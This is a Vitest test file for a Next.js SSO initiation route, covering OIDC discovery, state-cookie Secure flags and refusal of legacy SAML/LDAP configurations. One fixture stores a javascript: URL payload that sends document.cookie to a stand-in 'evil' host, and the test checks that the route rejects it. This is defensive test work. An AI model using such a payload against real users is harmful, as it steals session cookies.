// @vitest-environment node
import { describe, it, expect, vi, beforeEach } from "vitest";
import { NextRequest } from "next/server";

const teamFindUnique = vi.fn();

vi.mock("@/lib/db-users", () => ({
  prismaUsers: { team: { findUnique: (...a: unknown[]) => teamFindUnique(...a) } },
}));
vi.mock("@/lib/sso-encryption", () => ({
  decryptSSOConfig: (c: Record<string, unknown>) => c,
}));
vi.mock("@/lib/network-security", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@/lib/network-security")>()),
  validateDomainNotPrivate: vi.fn(async () => undefined),
}));

function team(provider: string, config: Record<string, unknown>) {
  return {
    id: "team-1",
    slug: "acme",
    ssoConfig: { provider, enabled: true, config },
  };
}

async function initiate() {
  const { POST } = await import("@/app/api/auth/sso/initiate/route");
  return POST(
    new NextRequest("https://lynxprompt.test/api/auth/sso/initiate", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ teamSlug: "acme", callbackUrl: "/dashboard" }),
    })
  );
}

describe("POST /api/auth/sso/initiate", () => {
  beforeEach(() => {
    vi.resetModules();
    vi.unstubAllEnvs();
    vi.unstubAllGlobals();
    teamFindUnique.mockReset();
    vi.stubEnv("ENABLE_SSO", "true");
    vi.stubEnv("NEXTAUTH_SECRET", "test-secret");
    vi.stubEnv("NEXTAUTH_URL", "https://lynxprompt.test");
  });

  it("never hands the browser a stored javascript: authorization URL", async () => {
    teamFindUnique.mockResolvedValue(
      team("OIDC", {
        issuer: "https://idp.example.com",
        clientId: "c",
        authorizationUrl: "javascript:fetch('//evil/'+document.cookie)//",
        tokenUrl: "https://idp.example.com/token",
        userInfoUrl: "https://idp.example.com/userinfo",
      })
    );

    const res = await initiate();
    const body = await res.json();

    expect(res.status).toBe(502);
    expect(body.redirectUrl).toBeUndefined();
  });

  it("reads the authorization endpoint from OIDC discovery", async () => {
    const issuer = "https://acme.okta.com/oauth2/default";
    teamFindUnique.mockResolvedValue(team("OIDC", { issuer, clientId: "c" }));
    const fetchMock = vi.fn(async (_url: string) =>
      new Response(
        JSON.stringify({
          issuer,
          authorization_endpoint: `${issuer}/v1/authorize`,
          token_endpoint: `${issuer}/v1/token`,
          userinfo_endpoint: `${issuer}/v1/userinfo`,
        }),
        { status: 200 }
      )
    );
    vi.stubGlobal("fetch", fetchMock);

    const res = await initiate();
    const body = await res.json();

    expect(res.status).toBe(200);
    expect(String(fetchMock.mock.calls[0][0])).toBe(`${issuer}/.well-known/openid-configuration`);
    const redirect = new URL(body.redirectUrl);
    expect(`${redirect.origin}${redirect.pathname}`).toBe(`${issuer}/v1/authorize`);
    expect(redirect.searchParams.get("client_id")).toBe("c");
  });

  it("sets the state cookie without Secure on an http instance", async () => {
    vi.stubEnv("NEXTAUTH_URL", "http://localhost:3000");
    teamFindUnique.mockResolvedValue(
      team("OIDC", {
        issuer: "https://idp.example.com",
        clientId: "c",
        authorizationUrl: "https://idp.example.com/authorize",
        tokenUrl: "https://idp.example.com/token",
        userInfoUrl: "https://idp.example.com/userinfo",
      })
    );

    const res = await initiate();

    expect(res.status).toBe(200);
    expect(res.cookies.get("sso_state")?.secure).toBe(false);
  });

  it("keeps the state cookie Secure on an https instance", async () => {
    teamFindUnique.mockResolvedValue(
      team("OIDC", {
        issuer: "https://idp.example.com",
        clientId: "c",
        authorizationUrl: "https://idp.example.com/authorize",
        tokenUrl: "https://idp.example.com/token",
        userInfoUrl: "https://idp.example.com/userinfo",
      })
    );

    const res = await initiate();

    expect(res.cookies.get("sso_state")?.secure).toBe(true);
  });

  it.each(["SAML", "LDAP"])("refuses a %s configuration saved before it was cut", async (provider) => {
    teamFindUnique.mockResolvedValue(team(provider, { ssoUrl: "https://idp.example.com/sso" }));
    const fetchMock = vi.fn();
    vi.stubGlobal("fetch", fetchMock);

    const res = await initiate();
    const body = await res.json();

    expect(res.status).toBe(400);
    expect(body.error).toContain("not supported");
    expect(body.redirectUrl).toBeUndefined();
    expect(fetchMock).not.toHaveBeenCalled();
  });
});
